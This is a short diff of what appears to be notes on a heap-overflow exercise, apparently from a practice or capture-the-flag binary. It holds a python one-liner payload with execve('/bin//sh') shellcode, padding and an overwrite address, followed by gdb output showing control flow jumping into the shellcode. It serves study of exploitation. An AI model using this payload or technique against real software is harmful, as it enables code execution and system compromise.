@@ -51,8 +51,7 @@ $3 = 108
 
 ```
 
-run $(python -c "print '\x10\xa0\x04\x08' +
-'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")
+run $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")
 
 (gdb)  x/70wx 0x804a000
 0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010
@@ -63,6 +62,27 @@ run $(python -c "print '\x10\xa0\x04\x08' +
 0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
 0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
 0x804a070:	0x41414141	0x41414141	0x0804a00c	0x00000000
+
+
+=> 0x08048693 <+159>:	call   *%edx
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:	leave
+   0x08048699 <+165>:	ret
+End of assembler dump.
+(gdb) i r
+eax            0x804a078	134520952
+ecx            0x804a00c	134520844
+edx            0x804a010	134520848
+ebx            0x804a078	134520952
+esp            0xbffff670	0xbffff670
+ebp            0xbffff698	0xbffff698
+esi            0x0	0
+edi            0x0	0
+eip            0x8048693	0x8048693 <main+159>
+
+(gdb) ni
+0x0804a010 in ?? ()
+
 ```
 
 ```
